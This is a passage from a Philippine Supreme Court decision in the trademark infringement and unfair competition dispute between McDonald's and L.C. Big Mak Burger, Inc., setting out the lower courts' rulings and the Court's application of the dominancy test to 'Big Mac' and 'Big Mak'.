hamburger sandwich. Plaintiff McDonald's fast-food chain has attained wide popularity and acceptance by the consuming public so much so that its air-conditioned food outlets and restaurants will perhaps not be mistaken by many to be the same as defendant corporation's mobile snack vans located along busy streets or highways. But the thing is that what is being sold by both contending parties is a food item a hamburger sandwich which is for immediate consumption, so that a buyer may easily be confused or deceived into thinking that the \"B[ig] M[ak]\" hamburger sandwich he bought is a food-product of plaintiff McDonald's, or a subsidiary or allied outlet thereof. Surely, defendant corporation has its own secret ingredients to make its hamburger sandwiches as palatable and as tasty as the other brands in the market, considering the keen competition among mushrooming hamburger stands and multinational fast-food chains and restaurants. Hence, the trademark \"B[ig] M[ac]\" has been infringed by defendant corporation when it used the name \"B[ig] M[ak]\" in its signages, wrappers, and containers in connection with its food business. xxxx\nDid the same acts of defendants in using the name \"B[ig] M[ak]\" as a trademark or tradename in their signages, or in causing the name \"B[ig] M[ak]\" to be printed on the wrappers and containers of their food products also constitute an act of unfair competition under Section 29 of the Trademark Law?\nThe answer is in the affirmative. xxxx\nThe xxx provision of the law concerning unfair competition is broader and more inclusive than the law concerning the infringement of trademark, which is of more limited range, but within its narrower range recognizes a more exclusive right derived by the adoption and registration of the trademark by the person whose goods or services are first associated therewith. xxx Notwithstanding the distinction between an action for trademark infringement and an action for unfair competition, however, the law extends substantially the same relief to the injured party for both cases. (See Sections 23 and 29 of Republic Act No. 166)\nAny conduct may be said to constitute unfair competition if the effect is to pass off on the public the goods of one man as the goods of another. The choice of \"B[ig] M[ak]\" as tradename by defendant corporation is not merely for sentimental reasons but was clearly made to take advantage of the reputation, popularity and the established goodwill of plaintiff McDonald's. For, as stated in Section 29, a person is guilty of unfair competition who in selling his goods shall give them the general appearance, of goods of another manufacturer or dealer, either as to the goods themselves or in the wrapping of the packages in which they are contained, or the devices or words thereon, or in any other feature of their appearance, which would likely influence purchasers to believe that the goods offered are those of a manufacturer or dealer other than the actual manufacturer or dealer. Thus, plaintiffs have established their valid cause of action against the defendants for trademark infringement and unfair competition and for damages.19\nThe dispositive portion of the RTC Decision provides:\nWHEREFORE, judgment is rendered in favor of plaintiffs McDonald's Corporation and McGeorge Food Industries, Inc. and against defendant L.C. Big Mak Burger, Inc., as follows:\n1. The writ of preliminary injunction issued in this case on [16 August 1990] is made permanent;\n2. Defendant L.C. Big Mak Burger, Inc. is ordered to pay plaintiffs actual damages in the amount of P400,000.00, exemplary damages in the amount of P100,000.00, and attorney's fees and expenses of litigation in the amount of P100,000.00;\n3. The complaint against defendants Francis B. Dy, Edna A. Dy, Rene B. Dy, Wiliam B. Dy, Jesus Aycardo, Araceli Aycardo and Grace Huerto, as well as all counter-claims, are dismissed for lack of merit as well as for insufficiency of evidence.20\nRespondents appealed to the Court of Appeals.\nThe Ruling of the Court of Appeals\nOn 26 November 1999, the Court of Appeals rendered judgment (\"Court of Appeals' Decision\") reversing the RTC Decision and ordering McDonald's to pay respondents P1,600,000 as actual and compensatory damages and P300,000 as moral damages. The Court of Appeals held:\nPlaintiffs-appellees in the instant case would like to impress on this Court that the use of defendants-appellants of its corporate name the whole \"L.C. B[ig] M[ak] B[urger], I[nc].\" which appears on their food packages, signages and advertisements is an infringement of their trademark \"B[ig] M[ac]\" which they use to identify [their] double decker sandwich, sold in a Styrofoam box packaging material with the McDonald's logo of umbrella \"M\" stamped thereon, together with the printed mark in red bl[o]ck capital letters, the words being separated by a single space. Specifically, plaintiffs-appellees argue that defendants-appellants' use of their corporate name is a colorable imitation of their trademark \"Big Mac\".\nTo Our mind, however, this Court is fully convinced that no colorable imitation exists. As the definition dictates, it is not sufficient that a similarity exists in both names, but that more importantly, the over-all presentation, or in their essential, substantive and distinctive parts is such as would likely MISLEAD or CONFUSE persons in the ordinary course of purchasing the genuine article. A careful comparison of the way the trademark \"B[ig] M[ac]\" is being used by plaintiffs-appellees and corporate name L.C. Big Mak Burger, Inc. by defendants-appellants, would readily reveal that no confusion could take place, or that the ordinary purchasers would be misled by it. As pointed out by defendants-appellants, the plaintiffs-appellees' trademark is used to designate only one product, a double decker sandwich sold in a Styrofoam box with the \"McDonalds\" logo. On the other hand, what the defendants-appellants corporation is using is not a trademark for its food product but a business or corporate name. They use the business name \"L.C. Big Mak Burger, Inc.\" in their restaurant business which serves diversified food items such as siopao, noodles, pizza, and sandwiches such as hotdog, ham, fish burger and hamburger. Secondly, defendants-appellants' corporate or business name appearing in the food packages and signages are written in silhouette red-orange letters with the \"b\" and \"m\" in upper case letters. Above the words \"Big Mak\" are the upper case letter \"L.C.\". Below the words \"Big Mak\" are the words \"Burger, Inc.\" spelled out in upper case letters. Furthermore, said corporate or business name appearing in such food packages and signages is always accompanied by the company mascot, a young chubby boy named Maky who wears a red T-shirt with the upper case \"m\" appearing therein and a blue lower garment. Finally, the defendants-appellants' food packages are made of plastic material.\nxxx [I]t is readily apparent to the naked eye that there appears a vast difference in the appearance of the product and the manner that the tradename \"Big Mak\" is being used and presented to the public. As earlier noted, there are glaring dissimilarities between plaintiffs-appellees' trademark and defendants-appellants' corporate name. Plaintiffs-appellees' product carrying the trademark \"B[ig] M[ac]\" is a double decker sandwich (depicted in the tray mat containing photographs of the various food products xxx sold in a Styrofoam box with the \"McDonald's\" logo and trademark in red, bl[o]ck capital letters printed thereon xxx at a price which is more expensive than the defendants-appellants' comparable food products. In order to buy a \"Big Mac\", a customer needs to visit an air-conditioned \"McDonald's\" restaurant usually located in a nearby commercial center, advertised and identified by its logo - the umbrella \"M\", and its mascot \"Ronald McDonald\". A typical McDonald's restaurant boasts of a playground for kids, a second floor to accommodate additional customers, a drive-thru to allow customers with cars to make orders without alighting from their vehicles, the interiors of the building are well-lighted, distinctly decorated and painted with pastel colors xxx. In buying a \"B[ig] M[ac]\", it is necessary to specify it by its trademark. Thus, a customer needs to look for a \"McDonald's\" and enter it first before he can find a hamburger sandwich which carry the mark \"Big Mac\". On the other hand, defendants-appellants sell their goods through snack vans xxxx\nAnent the allegation that defendants-appellants are guilty of unfair competition, We likewise find the same untenable.\nUnfair competition is defined as \"the employment of deception or any other means contrary to good faith by which a person shall pass off the goods manufactured by him or in which he deals, or his business, or service, for those of another who has already established good will for his similar good, business or services, or any acts calculated to produce the same result\" (Sec. 29, Rep. Act No. 166, as amended).\nTo constitute unfair competition therefore it must necessarily follow that there was malice and that the entity concerned was in bad faith.\nIn the case at bar, We find no sufficient evidence adduced by plaintiffs-appellees that defendants-appellants deliberately tried to pass off the goods manufactured by them for those of plaintiffs-appellees. The mere suspected similarity in the sound of the defendants-appellants' corporate name with the plaintiffs-appellees' trademark is not sufficient evidence to conclude unfair competition. Defendants-appellants explained that the name \"M[ak]\" in their corporate name was derived from both the first names of the mother and father of defendant Francis Dy, whose names are Maxima and Kimsoy. With this explanation, it is up to the plaintiffs-appellees to prove bad faith on the part of defendants-appellants. It is a settled rule that the law always presumes good faith such that any person who seeks to be awarded damages due to acts of another has the burden of proving that the latter acted in bad faith or with ill motive. 21\nPetitioners sought reconsideration of the Court of Appeals' Decision but the appellate court denied their motion in its Resolution of 11 July 2000.\nHence, this petition for review.\nPetitioners raise the following grounds for their petition:\nI. THE COURT OF APPEALS ERRED IN FINDING THAT RESPONDENTS' CORPORATE NAME \"L.C. BIG MAK BURGER, INC.\" IS NOT A COLORABLE IMITATION OF THE MCDONALD'S TRADEMARK \"BIG MAC\", SUCH COLORABLE IMITATION BEING AN ELEMENT OF TRADEMARK INFRINGEMENT.\nA. Respondents use the words \"Big Mak\" as trademark for their products and not merely as their business or corporate name.\nB. As a trademark, respondents' \"Big Mak\" is undeniably and unquestionably similar to petitioners' \"Big Mac\" trademark based on the dominancy test and the idem sonans test resulting inexorably in confusion on the part of the consuming public.\nII. THE COURT OF APPEALS ERRED IN REFUSING TO CONSIDER THE INHERENT SIMILARITY BETWEEN THE MARK \"BIG MAK\" AND THE WORD MARK \"BIG MAC\" AS AN INDICATION OF RESPONDENTS' INTENT TO DECEIVE OR DEFRAUD FOR PURPOSES OF ESTABLISHING UNFAIR COMPETITION.22\nPetitioners pray that we set aside the Court of Appeals' Decision and reinstate the RTC Decision.\nIn their Comment to the petition, respondents question the propriety of this petition as it allegedly raises only questions of fact. On the merits, respondents contend that the Court of Appeals committed no reversible error in finding them not liable for trademark infringement and unfair competition and in ordering petitioners to pay damages.\nThe issues are:\n1. Procedurally, whether the questions raised in this petition are proper for a petition for review under Rule 45.\n2. On the merits, (a) whether respondents used the words \"Big Mak\" not only as part of the corporate name \"L.C. Big Mak Burger, Inc.\" but also as a trademark for their hamburger products, and (b) whether respondent corporation is liable for trademark infringement and unfair competition.23\nThe Court's Ruling\nThe petition has merit.\nOn Whether the Questions Raised in the Petition are Proper for a Petition for Review\nA party intending to appeal from a judgment of the Court of Appeals may file with this Court a petition for review under Section 1 of Rule 45 (\"Section 1\")24 raising only questions of law. A question of law exists when the doubt or difference arises on what the law is on a certain state of facts. There is a question of fact when the doubt or difference arises on the truth or falsity of the alleged facts. 25\nHere, petitioners raise questions of fact and law in assailing the Court of Appeals' findings on respondent corporation's non-liability for trademark infringement and unfair competition. Ordinarily, the Court can deny due course to such a petition. In view, however, of the contradictory findings of fact of the RTC and Court of Appeals, the Court opts to accept the petition, this being one of the recognized exceptions to Section 1.26 We took a similar course of action in Asia Brewery, Inc. v. Court of Appeals27 which also involved a suit for trademark infringement and unfair competition in which the trial court and the Court of Appeals arrived at conflicting findings.\nOn the Manner Respondents Used\n\"Big Mak\" in their Business\nPetitioners contend that the Court of Appeals erred in ruling that the corporate name \"L.C. Big Mak Burger, Inc.\" appears in the packaging for respondents' hamburger products and not the words \"Big Mak\" only.\nThe contention has merit.\nThe evidence presented during the hearings on petitioners' motion for the issuance of a writ of preliminary injunction shows that the plastic wrappings and plastic bags used by respondents for their hamburger sandwiches bore the words \"Big Mak.\" The other descriptive words \"burger\" and \"100% pure beef\" were set in smaller type, along with the locations of branches.28 Respondents' cash invoices simply refer to their hamburger sandwiches as \"Big Mak.\"29 It is respondents' snack vans that carry the words \"L.C. Big Mak Burger, Inc.\"30\nIt was only during the trial that respondents presented in evidence the plastic wrappers and bags for their hamburger sandwiches relied on by the Court of Appeals.31 Respondents' plastic wrappers and bags were identical with those petitioners presented during the hearings for the injunctive writ except that the letters \"L.C.\" and the words \"Burger, Inc.\" in respondents' evidence were added above and below the words \"Big Mak,\" respectively. Since petitioners' complaint was based on facts existing before and during the hearings on the injunctive writ, the facts established during those hearings are the proper factual bases for the disposition of the issues raised in this petition.\nOn the Issue of Trademark Infringement\nSection 22 (\"Section 22) of Republic Act No. 166, as amended (\"RA 166\"), the law applicable to this case,32 defines trademark infringement as follows:\nInfringement, what constitutes. Any person who [1] shall use, without the consent of the registrant, any reproduction, counterfeit, copy or colorable imitation of any registered mark or trade-name in connection with the sale, offering for sale, or advertising of any goods, business or services on or in connection with which such use is likely to cause confusion or mistake or to deceive purchasers or others as to the source or origin of such goods or services, or identity of such business; or [2] reproduce, counterfeit, copy, or colorably imitate any such mark or trade-name and apply such reproduction, counterfeit, copy, or colorable imitation to labels, signs, prints, packages, wrappers, receptacles or advertisements intended to be used upon or in connection with such goods, business or services, shall be liable to a civil action by the registrant for any or all of the remedies herein provided.33\nPetitioners base their cause of action under the first part of Section 22, i.e. respondents allegedly used, without petitioners' consent, a colorable imitation of the \"Big Mac\" mark in advertising and selling respondents' hamburger sandwiches. This likely caused confusion in the mind of the purchasing public on the source of the hamburgers or the identity of the business.\nTo establish trademark infringement, the following elements must be shown: (1) the validity of plaintiff's mark; (2) the plaintiff's ownership of the mark; and (3) the use of the mark or its colorable imitation by the alleged infringer results in \"likelihood of confusion.\"34 Of these, it is the element of likelihood of confusion that is the gravamen of trademark infringement.35\nOn the Validity of the \"Big Mac\"Mark\nand McDonald's Ownership of such Mark\nA mark is valid if it is \"distinctive\" and thus not barred from registration under Section 436 of RA 166 (\"Section 4\"). However, once registered, not only the mark's validity but also the registrant's ownership of the mark is prima facie presumed.37\nRespondents contend that of the two words in the \"Big Mac\" mark, it is only the word \"Mac\" that is valid because the word \"Big\" is generic and descriptive (proscribed under Section 4[e]), and thus \"incapable of exclusive appropriation.\"38\nThe contention has no merit. The \"Big Mac\" mark, which should be treated in its entirety and not dissected word for word,39 is neither generic nor descriptive. Generic marks are commonly used as the name or description of a kind of goods,40 such as \"Lite\" for beer41 or \"Chocolate Fudge\" for chocolate soda drink.42 Descriptive marks, on the other hand, convey the characteristics, functions, qualities or ingredients of a product to one who has never seen it or does not know it exists,43 such as \"Arthriticare\" for arthritis medication.44 On the contrary, \"Big Mac\" falls under the class of fanciful or arbitrary marks as it bears no logical relation to the actual characteristics of the product it represents.45 As such, it is highly distinctive and thus valid. Significantly, the trademark \"Little Debbie\" for snack cakes was found arbitrary or fanciful.46\nThe Court also finds that petitioners have duly established McDonald's exclusive ownership of the \"Big Mac\" mark. Although Topacio and the Isaiyas Group registered the \"Big Mac\" mark ahead of McDonald's, Topacio, as petitioners disclosed, had already assigned his rights to McDonald's. The Isaiyas Group, on the other hand, registered its trademark only in the Supplemental Register. A mark which is not registered in the Principal Register, and thus not distinctive, has no real protection.47 Indeed, we have held that registration in the Supplemental Register is not even a prima facie evidence of the validity of the registrant's exclusive right to use the mark on the goods specified in the certificate.48\nOn Types of Confusion\nSection 22 covers two types of confusion arising from the use of similar or colorable imitation marks, namely, confusion of goods (product confusion) and confusion of business (source or origin confusion). In Sterling Products International, Incorporated v. Farbenfabriken Bayer Aktiengesellschaft, et al.,49 the Court distinguished these two types of confusion, thus:\n[Rudolf] Callman notes two types of confusion. The first is the confusion of goods \"in which event the ordinarily prudent purchaser would be induced to purchase one product in the belief that he was purchasing the other.\" xxx The other is the confusion of business: \"Here though the goods of the parties are different, the defendant's product is such as might reasonably be assumed to originate with the plaintiff, and the public would then be deceived either into that belief or into the belief that there is some connection between the plaintiff and defendant which, in fact, does not exist.\"\nUnder Act No. 666,50 the first trademark law, infringement was limited to confusion of goods only, when the infringing mark is used on \"goods of a similar kind.\"51 Thus, no relief was afforded to the party whose registered mark or its colorable imitation is used on different although related goods. To remedy this situation, Congress enacted RA 166 on 20 June 1947. In defining trademark infringement, Section 22 of RA 166 deleted the requirement in question and expanded its scope to include such use of the mark or its colorable imitation that is likely to result in confusion on \"the source or origin of such goods or services, or identity of such business.\"52 Thus, while there is confusion of goods when the products are competing, confusion of business exists when the products are non-competing but related enough to produce confusion of affiliation.53\nOn Whether Confusion of Goods and\nConfusion of Business are Applicable\nPetitioners claim that respondents' use of the \"Big Mak\" mark on respondents' hamburgers results in confusion of goods, particularly with respect to petitioners' hamburgers labeled \"Big Mac.\" Thus, petitioners alleged in their complaint:\n1.15. Defendants have unduly prejudiced and clearly infringed upon the property rights of plaintiffs in the McDonald's Marks, particularly the mark \"B[ig] M[ac]\". Defendants' unauthorized acts are likely, and calculated, to confuse, mislead or deceive the public into believing that the products and services offered by defendant Big Mak Burger, and the business it is engaged in, are approved and sponsored by, or affiliated with, plaintiffs.54 (Emphasis supplied)\nSince respondents used the \"Big Mak\" mark on the same goods, i.e. hamburger sandwiches, that petitioners' \"Big Mac\" mark is used, trademark infringement through confusion of goods is a proper issue in this case.\nPetitioners also claim that respondents' use of the \"Big Mak\" mark in the sale of hamburgers, the same business that petitioners are engaged in, results in confusion of business. Petitioners alleged in their complaint:\n1.10. For some period of time, and without the consent of plaintiff McDonald's nor its licensee/franchisee, plaintiff McGeorge, and in clear violation of plaintiffs' exclusive right to use and/or appropriate the McDonald's marks, defendant Big Mak Burger acting through individual defendants, has been operating \"Big Mak Burger\", a fast food restaurant business dealing in the sale of hamburger and cheeseburger sandwiches, french fries and other food products, and has caused to be printed on the wrapper of defendant's food products and incorporated in its signages the name \"Big Mak Burger\", which is confusingly similar to and/or is a colorable imitation of the plaintiff McDonald's mark \"B[ig] M[ac]\", xxx. Defendant Big Mak Burger has thus unjustly created the impression that its business is approved and sponsored by, or affiliated with, plaintiffs. xxxx\n2.2 As a consequence of the acts committed by defendants, which unduly prejudice and infringe upon the property rights of plaintiffs McDonald's and McGeorge as the real owner and rightful proprietor, and the licensee/franchisee, respectively, of the McDonald's marks, and which are likely to have caused confusion or deceived the public as to the true source, sponsorship or affiliation of defendants' food products and restaurant business, plaintiffs have suffered and continue to suffer actual damages in the form of injury to their business reputation and goodwill, and of the dilution of the distinctive quality of the McDonald's marks, in particular, the mark \"B[ig] M[ac]\".55 (Emphasis supplied)\nRespondents admit that their business includes selling hamburger sandwiches, the same food product that petitioners sell using the \"Big Mac\" mark. Thus, trademark infringement through confusion of business is also a proper issue in this case.\nRespondents assert that their \"Big Mak\" hamburgers cater mainly to the low-income group while petitioners' \"Big Mac\" hamburgers cater to the middle and upper income groups. Even if this is true, the likelihood of confusion of business remains, since the low-income group might be led to believe that the \"Big Mak\" hamburgers are the low-end hamburgers marketed by petitioners. After all, petitioners have the exclusive right to use the \"Big Mac\" mark. On the other hand, respondents would benefit by associating their low-end hamburgers, through the use of the \"Big Mak\" mark, with petitioners' high-end \"Big Mac\" hamburgers, leading to likelihood of confusion in the identity of business.\nRespondents further claim that petitioners use the \"Big Mac\" mark only on petitioners' double-decker hamburgers, while respondents use the \"Big Mak\" mark on hamburgers and other products like siopao, noodles and pizza. Respondents also point out that petitioners sell their Big Mac double-deckers in a styrofoam box with the \"McDonald's\" logo and trademark in red, block letters at a price more expensive than the hamburgers of respondents. In contrast, respondents sell their Big Mak hamburgers in plastic wrappers and plastic bags. Respondents further point out that petitioners' restaurants are air-conditioned buildings with drive-thru service, compared to respondents' mobile vans.\nThese and other factors respondents cite cannot negate the undisputed fact that respondents use their \"Big Mak\" mark on hamburgers, the same food product that petitioners' sell with the use of their registered mark \"Big Mac.\" Whether a hamburger is single, double or triple-decker, and whether wrapped in plastic or styrofoam, it remains the same hamburger food product. Even respondents' use of the \"Big Mak\" mark on non-hamburger food products cannot excuse their infringement of petitioners' registered mark, otherwise registered marks will lose their protection under the law.\nThe registered trademark owner may use his mark on the same or similar products, in different segments of the market, and at different price levels depending on variations of the products for specific segments of the market. The Court has recognized that the registered trademark owner enjoys protection in product and market areas that are the normal potential expansion of his business. Thus, the Court has declared:\nModern law recognizes that the protection to which the owner of a trademark is entitled is not limited to guarding his goods or business from actual market competition with identical or similar products of the parties, but extends to all cases in which the use by a junior appropriator of a trade-mark or trade-name is likely to lead to a confusion of source, as where prospective purchasers would be misled into thinking that the complaining party has extended his business into the field (see 148 ALR 56 et seq; 53 Am Jur. 576) or is in any way connected with the activities of the infringer; or when it forestalls the normal potential expansion of his business (v. 148 ALR, 77, 84; 52 Am. Jur. 576, 577).56 (Emphasis supplied)\nOn Whether Respondents' Use of the \"Big Mak\"\nMark Results in Likelihood of Confusion\nIn determining likelihood of confusion, jurisprudence has developed two tests, the dominancy test and the holistic test.57 The dominancy test focuses on the similarity of the prevalent features of the competing trademarks that might cause confusion. In contrast, the holistic test requires the court to consider the entirety of the marks as applied to the products, including the labels and packaging, in determining confusing similarity.\nThe Court of Appeals, in finding that there is no likelihood of confusion that could arise in the use of respondents' \"Big Mak\" mark on hamburgers, relied on the holistic test. Thus, the Court of Appeals ruled that \"it is not sufficient that a similarity exists in both name(s), but that more importantly, the overall presentation, or in their essential, substantive and distinctive parts is such as would likely MISLEAD or CONFUSE persons in the ordinary course of purchasing the genuine article.\" The holistic test considers the two marks in their entirety, as they appear on the goods with their labels and packaging. It is not enough to consider their words and compare the spelling and pronunciation of the words.58\nRespondents now vigorously argue that the Court of Appeals' application of the holistic test to this case is correct and in accord with prevailing jurisprudence.\nThis Court, however, has relied on the dominancy test rather than the holistic test. The dominancy test considers the dominant features in the competing marks in determining whether they are confusingly similar. Under the dominancy test, courts give greater weight to the similarity of the appearance of the product arising from the adoption of the dominant features of the registered mark, disregarding minor differences.59 Courts will consider more the aural and visual impressions created by the marks in the public mind, giving little weight to factors like prices, quality, sales outlets and market segments.\nThus, in the 1954 case of Co Tiong Sa v. Director of Patents,60 the Court ruled:\nxxx It has been consistently held that the question of infringement of a trademark is to be determined by the test of dominancy. Similarity in size, form and color, while relevant, is not conclusive. If the competing trademark contains the main or essential or dominant features of another, and confusion and deception is likely to result, infringement takes place. Duplication or imitation is not necessary; nor is it necessary that the infringing label should suggest an effort to imitate. (G. Heilman Brewing Co. vs. Independent Brewing Co., 191 F., 489, 495, citing Eagle White Lead Co. vs. Pflugh (CC) 180 Fed. 579). The question at issue in cases of infringement of trademarks is whether the use of the marks involved would be likely to cause confusion or mistakes in the mind of the public or deceive purchasers. (Auburn Rubber Corporation vs. Honover Rubber Co., 107 F. 2d 588; xxx) (Emphasis supplied.)\nThe Court reiterated the dominancy test in Lim Hoa v. Director of Patents,61 Phil. Nut Industry, Inc. v. Standard Brands Inc.,62 Converse Rubber Corporation v. Universal Rubber Products, Inc.,63 and Asia Brewery, Inc. v. Court of Appeals.64 In the 2001 case of Societe Des Produits Nestl\u00e9, S.A. v. Court of Appeals,65 the Court explicitly rejected the holistic test in this wise:\n[T]he totality or holistic test is contrary to the elementary postulate of the law on trademarks and unfair competition that confusing similarity is to be determined on the basis of visual, aural, connotative comparisons and overall impressions engendered by the marks in controversy as they are encountered in the realities of the marketplace. (Emphasis supplied)\nThe test of dominancy is now explicitly incorporated into law in Section 155.1 of the Intellectual Property Code which defines infringement as the \"colorable imitation of a registered mark xxx or a dominant feature thereof.\"\nApplying the dominancy test, the Court finds that respondents' use of the \"Big Mak\" mark results in likelihood of confusion. First, \"Big Mak\" sounds exactly the same as \"Big Mac.\" Second, the first word in \"Big Mak\" is exactly the same as the first word in \"Big Mac.\" Third, the first two letters in \"Mak\" are the same as the first two letters in \"Mac.\" Fourth, the last letter in \"Mak\" while a \"k\" sounds the same as \"c\" when the word \"Mak\" is pronounced. Fifth, in Filipino, the letter \"k\" replaces \"c\" in spelling, thus \"Caloocan\" is spelled \"Kalookan.\"\nIn short, aurally the two marks are the same, with the first word of both marks phonetically the same, and the second word of both marks also phonetically the same. Visually, the two marks have both two words and six letters, with the first word of both marks having the same letters and the second word having the same first two letters. In spelling, considering the Filipino language, even the last letters of both marks are the same.\nClearly, respondents have adopted in \"Big Mak\" not only the dominant but also almost all the features of \"Big Mac.\" Applied to the same food product of hamburgers, the two marks will likely result in confusion in the public mind.\nThe Court has taken into account the aural effects of the words and letters contained in the marks in determining the issue of confusing similarity. Thus, in Marvex Commercial Co., Inc. v. Petra Hawpia & Co., et al.,66 the Court held:\nThe following random list of confusingly similar sounds in the matter of trademarks, culled from Nims, Unfair Competition and Trade Marks, 1947, Vol. 1, will reinforce our view that \"SALONPAS\" and \"LIONPAS\" are confusingly similar in sound: \"Gold Dust\" and \"Gold Drop\"; \"Jantzen\" and \"Jass-Sea\"; \"Silver Flash\" and \"Supper Flash\"; \"Cascarete\" and \"Celborite\"; \"Celluloid\" and \"Cellonite\"; \"Chartreuse\" and \"Charseurs\"; \"Cutex\" and \"Cuticlean\"; \"Hebe\" and \"Meje\"; \"Kotex\" and \"Femetex\"; \"Zuso\" and \"Hoo Hoo\". Leon Amdur, in his book \"Trade-Mark Law and Practice\", pp. 419-421, cities, as coming within the purview of the idem sonans rule, \"Yusea\" and \"U-C-A\", \"Steinway Pianos\" and \"Steinberg Pianos\", and \"Seven-Up\" and \"Lemon-Up\". In Co Tiong vs. Director of Patents, this Court unequivocally said that \"Celdura\" and \"Cordura\" are confusingly similar in sound; this Court held in Sapolin Co. vs. Balmaceda, 67 Phil. 795 that the name \"Lusolin\" is an infringement of the trademark \"Sapolin\", as the sound of the two names is almost the same. (Emphasis supplied)\nCertainly, \"Big Mac\" and \"Big Mak\" for hamburgers create even greater confusion, not only aurally but also visually.\nIndeed, a person cannot distinguish \"Big Mac\" from \"Big Mak\" by their sound. When one hears a \"Big Mac\" or \"Big Mak\" hamburger advertisement over the radio, one would not know whether the \"Mac\" or \"Mak\" ends with a \"c\" or a \"k.\"\nPetitioners' aggressive promotion of the \"Big Mac\" mark, as borne by their advertisement expenses, has built goodwill and reputation for such mark making it one of the easily recognizable marks in the market today. This increases the likelihood that consumers will mistakenly associate petitioners' hamburgers and business with those of respondents'.\nRespondents' inability to explain sufficiently how and why they came to choose \"Big Mak\" for their hamburger sandwiches indicates their intent to imitate petitioners' \"Big Mac\" mark. Contrary to the Court of Appeals' finding, respondents' claim that their \"Big Mak\" mark was inspired by the first names of respondent Dy's mother (Maxima) and father (Kimsoy) is not credible. As petitioners well noted:\n[R]espondents, particularly Respondent Mr. Francis Dy, could have arrived at a more creative choice for a corporate name by using the names of his parents, especially since he was allegedly driven by sentimental reasons. For one, he could have put his father's name ahead of his mother's, as is usually done in this patriarchal society, and derived letters from said names in that order. Or, he could have taken an equal number of letters (i.e., two) from each name, as is the more usual thing done. Surely, the more plausible reason behind Respondents' choice of the word \"M[ak]\", especially when taken in conjunction with the word \"B[ig]\", was their intent to take advantage of Petitioners' xxx \"B[ig] M[ac]\" trademark, with their alleged sentiment-focused \"explanation\" merely thought of as a convenient, albeit unavailing, excuse or defense for such an unfair choice of name.67\nAbsent proof that respondents' adoption of the \"Big Mak\" mark was due to honest mistake or was fortuitous,68 the inescapable conclusion is that respondents adopted the \"Big Mak\" mark to \"ride on the coattails\" of the more established \"Big Mac\" mark.69 This saves respondents much of the expense in advertising to create market recognition of their mark and hamburgers.70\nThus, we hold that confusion is likely to result in the public mind. We sustain petitioners' claim of trademark infringement.\nOn the Lack of Proof of\nActual Confusion\nPetitioners' failure to present proof of actual confusion does not negate their claim of trademark infringement. As noted in American Wire & Cable Co. v. Director of Patents,71 Section 22 requires the less stringent standard of \"likelihood of confusion\" only. While proof of actual confusion is the best evidence of infringement, its absence is inconsequential.72\nOn the Issue of Unfair Competition\nSection 29 (\"Section 29\")73 of RA 166 defines unfair competition, thus:\nAny person who will employ deception or any other means contrary to good faith by which he shall pass off the goods manufactured by him or in which he deals, or his business, or services for those of the one having established such goodwill, or who shall commit any acts calculated to produce said result, shall be guilty of unfair competition, and shall be subject to an action therefor.\nIn particular, and without in any way limiting the scope of unfair competition, the following shall be deemed guilty of unfair competition:\n(a) Any person, who in selling his goods shall give them the general appearance of goods of another manufacturer or dealer, either as to the goods themselves or in the wrapping of the packages in which they are contained, or the devices or words thereon, or in any feature of their appearance, which would be likely to influence purchasers to believe that the goods offered are those of a manufacturer or dealer, other than the actual manufacturer or dealer, or who otherwise clothes the goods with such appearance as shall deceive the public and defraud another of his legitimate trade, or any subsequent vendor of such goods or any agent of any vendor engaged in selling such goods with a like purpose;\n(b) Any person who by any artifice, or device, or who employs any other means calculated to induce the false belief that such person is offering the services of another who has identified such services in the mind of the public; or\n(c) Any person who shall make any false statement in the course of trade or who shall commit any other act contrary to good faith of a nature calculated to discredit the goods, business or services of another. (Emphasis supplied)\nThe essential elements of an action for unfair competition are (1) confusing similarity in the general appearance of the goods, and (2) intent to deceive the public and defraud a competitor.74 The confusing similarity may or may not result from similarity in the marks, but may result from other external factors in the packaging or presentation of the goods. The intent to deceive and defraud may be inferred from the similarity of the appearance of the goods as offered for sale to the public.75 Actual fraudulent intent need not be shown.76\nUnfair competition is broader than trademark infringement and includes passing off goods with or without trademark infringement. Trademark infringement is a form of unfair competition.77 Trademark infringement constitutes unfair competition when there is not merely likelihood of confusion, but also actual or probable deception on the public because of the general appearance of the goods. There can be trademark infringement without unfair competition as when the infringer discloses on the labels containing the mark that he manufactures the goods, thus preventing the public from being deceived that the goods originate from the trademark owner.78\nTo support their claim of unfair competition, petitioners allege that respondents fraudulently passed off their hamburgers as \"Big Mac\" hamburgers. Petitioners add that respondents' fraudulent intent can be inferred from the similarity of the marks in question.79\nPassing off (or palming off) takes place where the defendant, by imitative devices on the general appearance of the goods, misleads prospective purchasers into buying his merchandise under the impression that they are buying that of his competitors.80 Thus, the defendant gives his goods the general appearance of the goods of his competitor with the intention of deceiving the public that the goods are those of his competitor.\nThe RTC described the respective marks and the goods of petitioners and respondents in this wise:\nThe mark \"B[ig] M[ac]\" is used by plaintiff McDonald's to identify its double decker hamburger sandwich. The packaging material is a styrofoam box with the McDonald's logo and trademark in red with block capital letters printed on it. All letters of the \"B[ig] M[ac]\" mark are also in red and block capital letters. On the other hand, defendants' \"B[ig] M[ak]\" script print is in orange with only the letter \"B\" and \"M\" being capitalized and the packaging material is plastic wrapper. xxxx Further, plaintiffs' logo and mascot are the umbrella \"M\" and \"Ronald McDonald's\", respectively, compared to the mascot of defendant Corporation which is a chubby boy called \"Macky\" displayed or printed between the words \"Big\" and \"Mak.\"81 (Emphasis supplied)\nRespondents point to these dissimilarities as proof that they did not give their hamburgers the general appearance of petitioners' \"Big Mac\" hamburgers.\nThe dissimilarities in the packaging are minor compared to the stark similarities in the words that give respondents' \"Big Mak\" hamburgers the general appearance of petitioners' \"Big Mac\" hamburgers. Section 29(a) expressly provides that the similarity in the general appearance of the goods may be in the \"devices or words\" used on the wrappings. Respondents have applied on their plastic wrappers and bags almost the same words that petitioners use on their styrofoam box. What attracts the attention of the buying public are the words \"Big Mak\" which are almost the same, aurally and visually, as the words \"Big Mac.\" The dissimilarities in the material and other devices are insignificant compared to the glaring similarity in the words used in the wrappings.\nSection 29(a) also provides that the defendant gives \"his goods the general appearance of goods of another manufacturer.\" Respondents' goods are hamburgers which are also the goods of petitioners. If respondents sold egg sandwiches only instead of hamburger sandwiches, their use of the \"Big Mak\" mark would not give their goods the general appearance of petitioners' \"Big Mac\" hamburgers. In such case, there is only trademark infringement but no unfair competition. However, since respondents chose to apply the \"Big Mak\" mark on hamburgers, just like petitioner's use of the \"Big Mac\" mark on hamburgers, respondents have obviously clothed their goods with the general appearance of petitioners' goods.\nMoreover, there is no notice to the public that the \"Big Mak\" hamburgers are products of \"L.C. Big Mak Burger, Inc.\" Respondents introduced during the trial plastic wrappers and 